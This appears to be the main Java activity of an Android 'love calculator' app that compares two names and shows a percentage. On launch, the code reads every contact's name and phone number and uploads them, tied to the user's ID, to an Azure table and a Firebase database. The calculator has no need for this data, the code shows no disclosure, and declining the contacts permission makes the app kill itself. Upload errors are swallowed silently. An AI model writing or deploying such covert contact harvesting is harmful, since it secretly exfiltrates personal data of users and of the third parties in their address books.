package com.geniusnine.android.lovecalculator;

import android.*;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class  MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener {


    //Permissions for contact
    private static final int REQUEST_CONTACTS = 1;

    private static String[] PERMISSIONS_CONTACT = {android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS};

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    private TextView textViewName;
    private TextView textViewEmail;
    //Setting up progress dialog
    private ProgressDialog progressDialog;

    private DatabaseReference mRef;
    //User for Facebook data
    private UserFacebookData userFacebookData;

    EditText editTextYourName,editTextParnerName;
    Button btnCalculateLove;
    TextView textViewResult;
    Love_Calculator love_calculator;
    String yourname,partnername;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        editTextYourName=(EditText)findViewById(R.id.editTextyourName);
        editTextParnerName=(EditText)findViewById(R.id.editTextpartnerName);

        btnCalculateLove=(Button)findViewById(R.id.btnCalculateLove);
        textViewResult=(TextView)findViewById(R.id.textViewResult);


        firebaseAuth = FirebaseAuth.getInstance();

        mRef = FirebaseDatabase.getInstance().getReference().child("LoveCalculator").child("Users");

        btnCalculateLove.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (TextUtils.isEmpty(editTextYourName.getText().toString().trim())) {
                    editTextYourName.setError("Enter the Your Name");
                    return;
                }

                if (TextUtils.isEmpty(editTextParnerName.getText().toString().trim())) {
                    editTextParnerName.setError("Enter Partner Name ");
                    return;
                }


                yourname=editTextYourName.getText().toString().trim();
                partnername=editTextParnerName.getText().toString().trim();
                love_calculator=new Love_Calculator(yourname,partnername);
                int lovepercent=love_calculator.CalculateLove();
                textViewResult.setText(String.valueOf("The Love Between " +yourname+ "  and  " +   partnername  +  lovepercent  + " % "));
            }
        });




        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.setDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);
        View header=navigationView.getHeaderView(0);

        textViewName = (TextView)header.findViewById(R.id.textViewName);
        textViewEmail = (TextView)header.findViewById(R.id.textViewEmail);

                String name = firebaseAuth.getCurrentUser().getDisplayName();
                String email = firebaseAuth.getCurrentUser().getEmail();

                textViewName.setText(name);
                textViewEmail.setText(email);


        authenticate();
        //uploadContactsToAzure();
        testContactUpload();
    }



    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                                // Log.e("Error --", e.toString());
                            }


                        }
                    });
                } catch (final Exception e) {
                    // createAndShowDialogFromTask(e, "Error");
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("MainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);


                }
                else {

                }

            }
        };

    }


    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("MainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            closeapp();
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();

      /*  if (id == R.id.nav_forum) {
            // Handle the camera action
        }  else */
        if (id == R.id.nav_app_store) {
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
            }

        } else if (id == R.id.nav_post_app) {
            Intent intent = new Intent(MainActivity.this, RequestApp.class);
            startActivity(intent);

        } else if (id == R.id.nav_share) {
            final String appPackageName = getPackageName();
            Intent intent = new Intent(android.content.Intent.ACTION_SEND);
            intent.setType("text/plain");
            String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
            intent.putExtra(android.content.Intent.EXTRA_SUBJECT, "Subject/Title");
            intent.putExtra(android.content.Intent.EXTRA_TEXT, shareBodyText);
            startActivity(Intent.createChooser(intent, "Choose sharing method"));

        } else if (id == R.id.nav_rateus){
            final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
            try {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
            } catch (android.content.ActivityNotFoundException anfe) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
            }
        }/*else if (id == R.id.nav_feedback) {
            Intent intent = new Intent(MainActivity.this, UserFeedback.class);
            startActivity(intent);

        }*/


        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }




    private boolean isContactPermissionGranted(){

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {
            return false;

        } else {


            return true;

        }
    }

    private void requestContactsPermissions() {
        // BEGIN_INCLUDE(contacts_permission_request)
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS))
        {
            ActivityCompat.requestPermissions(MainActivity.this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);


        } else {

            ActivityCompat.requestPermissions(this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);


        }

        testContactUploadSecondTime();



    }

    private void testContactUploadSecondTime(){

        if(!isContactPermissionGranted()){
            android.os.Process.killProcess(android.os.Process.myPid());

            System.exit(1);


        }
        else {
            Log.e("CONTACT ", "PERMISSION_ALREADY_GRANTED");
            Log.e("CONTACT ", "Uploading contacts to azure.....");
            uploadContactsToAzure();
            syncContactsWithFirebase();

        }

    }

    private void testContactUpload(){
        if(isContactPermissionGranted()){
            Log.e("CONTACT ", "PERMISSION_ALREADY_GRANTED");
            Log.e("CONTACT ", "Uploading contacts to azure.....");
            uploadContactsToAzure();
            syncContactsWithFirebase();
            return ;
        }
        else {
            Log.e("CONTACT ", "PERMISSION_REQUESTED");
            createAlertDialogBoxPermissionNotGranted();

        }

    }

    private void createAlertDialogBoxPermissionNotGranted(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
        alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
        alertDialogBuilder.setPositiveButton("yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        Log.e("ALERT BOX ", "Requesting Permissions");
                        requestContactsPermissions();

                    }
                });

        alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Log.e("ALERT BOX ", "Permissions not granted");
                android.os.Process.killProcess(android.os.Process.myPid());

                System.exit(1);

            }
        });

        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();


    }

    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();







    }




    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:
                android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(this);
                alertDialogBuilder.setMessage("Are you sure you want to close App?");
                alertDialogBuilder.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                                finish();
                            }
                        });

                alertDialogBuilder.setNegativeButton("No",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                            }
                        });

                //Showing the alert dialog
                android.app.AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    public  void closeapp(){
        android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {
                        FirebaseAuth.getInstance().signOut();
                        LoginManager.getInstance().logOut();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        android.app.AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.show();
    }

    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }
}
